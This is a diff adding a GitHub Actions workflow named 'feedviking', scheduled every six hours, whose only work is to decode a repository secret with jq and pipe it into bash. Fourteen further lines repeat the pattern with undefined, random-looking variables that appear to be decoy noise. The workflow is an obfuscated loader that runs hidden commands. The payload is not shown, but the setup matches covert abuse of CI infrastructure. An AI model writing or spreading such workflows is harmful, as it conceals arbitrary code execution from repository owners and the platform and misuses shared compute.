@@ -1,0 +1,30 @@
+name: feedviking
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: feedviking
+        env:
+          k0713: ${{ secrets.k0713 }}
+        run: |
+          echo $k0713 | jq -r .cyeys9 | /bin/bash
+          echo $d8 | jq -r .n83226 | /bin/bash
+          echo $zatbe48441 | jq -r .bnfa4638 | /bin/bash
+          echo $lxfzn7 | jq -r .jpdbg88055 | /bin/bash
+          echo $xnbpr59692 | jq -r .jvqnt09180 | /bin/bash
+          echo $ulosi53 | jq -r .cjflr794 | /bin/bash
+          echo $dk791 | jq -r .ncc8478 | /bin/bash
+          echo $fm34 | jq -r .vr10265 | /bin/bash
+          echo $nbc09 | jq -r .umbzl7 | /bin/bash
+          echo $h1480 | jq -r .whtct52521 | /bin/bash
+          echo $d91972 | jq -r .iskkc06519 | /bin/bash
+          echo $pz7 | jq -r .e6 | /bin/bash
+          echo $vo0756 | jq -r .h818 | /bin/bash
+          echo $ghxiw7129 | jq -r .wlt60868 | /bin/bash
+          echo $mzw53 | jq -r .cg9 | /bin/bash
+
